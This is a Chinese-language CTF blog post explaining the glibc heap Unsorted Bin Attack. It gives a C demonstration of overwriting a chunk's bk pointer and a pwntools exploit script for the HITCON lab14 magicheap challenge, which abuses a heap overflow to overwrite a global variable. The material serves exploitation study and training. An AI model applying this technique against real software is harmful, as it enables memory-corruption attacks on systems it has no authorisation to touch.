
title: Unsorted Bin Attack

date: 2018-04-18 15:46:11

categories:
- CTF
- Unsorted Bin Attack


## 概述

Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。

Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。

Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。

### 基本来源

**Unsorted Bin 的基本来源以及基本使用情况:**

1. 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。
3. 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。

### 基本使用情况

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

## 原理

```!c
#!c
*p = malloc(400);
malloc(500);
free(p);
p[1] = (unsigned long)(&target_var - 2);
malloc(400);
```

**初始状态时**

unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。

**执行free(p)**

由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。

**修改p[1]**

**经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。**

**申请400大小的chunk**

此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。

![img-1](unsorted-bin-attack/img-1.png)

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

- 我们通过修改循环的次数来使得程序可以执行多次循环。
- 我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack了。


## HITCON Training lab14 magic heap

### 基本功能

程序大概就是自己写的堆管理器，主要有以下功能

1. 创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。
2. 编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里其实就出现了任意长度堆溢出的漏洞。
3. 删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。

同时，我们看到，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。

### 利用

很显然， 我们直接利用 unsorted bin attack 即可。

1. 释放一个堆块到 unsorted bin 中。
2. 利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-16。
3. 触发漏洞即可。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


create_heap(0x20, "dada")  # 0
create_heap(0x80, "dada")  # 1
# in order not to merge into top chunk
create_heap(0x20, "dada")  # 2

del_heap(1)

magic = 0x6020c0  # 目标地址
fd = 0
bk = magic - 0x10

edit_heap(0, 0x20 + 0x20, "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))
create_heap(0x80, "dada")  #trigger unsorted bin attack
r.recvuntil(":")
r.sendline("4869")
r.interactive()
```

## 题目  2016 0CTF zerostorage

参考：

https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unsorted_bin_attack/#2016-0ctf-zerostorage-

https://www.w0lfzhang.com/2017/03/17/2016-0CTF-zerostorage/

http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/

http://www.programlife.net/0ops-ctf-writeup.html





## 参考

[Unsorted Bin Attack](https://ctf-wiki.github.io/ctf-wiki/pwn/heap/unsorted_bin_attack/)

